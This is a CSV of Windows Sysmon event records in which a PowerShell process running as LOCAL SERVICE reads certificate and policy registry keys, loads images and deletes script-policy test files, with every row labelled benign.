timestamp,eventID,image,commandLine,parentImage,processId,filePath,protocol,destinationIp,user,severity,stage,label
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\SmartCardRoot,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\SmartCardRoot\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\SmartCardRoot\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\SmartCardRoot\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\trust,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9960000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9960000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0010000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0010000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0010000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0010000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0110000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0160000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0160000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0210000Z,26,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_5f34qx4d.0qx.ps1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0210000Z,26,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_i1jtgrrb.hiw.psm1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0610000Z,17,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0810000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.1460000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.1460000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.1660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3370000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
